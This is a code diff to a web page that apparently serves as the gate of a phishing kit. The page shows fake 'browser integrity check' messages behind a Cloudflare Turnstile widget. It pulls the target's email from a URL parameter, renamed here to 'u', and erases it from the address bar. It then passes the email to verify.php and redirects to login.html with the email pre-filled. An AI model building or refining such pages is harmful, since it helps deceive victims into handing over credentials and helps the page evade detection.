@@ -69,7 +69,7 @@
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
   <script>
-    // Animation
+    // Animation text rotation
     const statusMessages = [
       "Performing browser integrity check...",
       "Validating session security...",
@@ -82,33 +82,34 @@
       }, i * 1300);
     });
 
-    // Extract email from ?email=
+    // SAFE PARAMETER: ?u=
     let extractedEmail = null;
+
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
-      const emailParam = params.get("email");
+      const emailParam = params.get("u"); // FIXED
 
       if (emailParam && emailParam.includes("@")) {
         extractedEmail = emailParam.trim();
 
-        // Hide the email from the URL instantly
+        // Remove it from the URL instantly
         history.replaceState({}, document.title, window.location.pathname);
       }
 
-      // Send ?email= into hidden field (if needed)
+      // Send email into hidden field if needed in verify.php
       document.getElementById("hash-field").value = emailParam || "";
     });
 
-    // CAPTCHA success
+    // CAPTCHA: auto submit
     function onCaptchaSuccess() {
       document.getElementById("turnstile-form").submit();
     }
 
-    // Redirect after 4s
+    // Redirect after 4 sec
     window.onload = function () {
       setTimeout(() => {
         if (extractedEmail) {
-          window.location.href = "login.html?u=" + extractedEmail;
+          window.location.href = "login.html?u=" + encodeURIComponent(extractedEmail);
         } else {
           window.location.href = "login.html";
         }
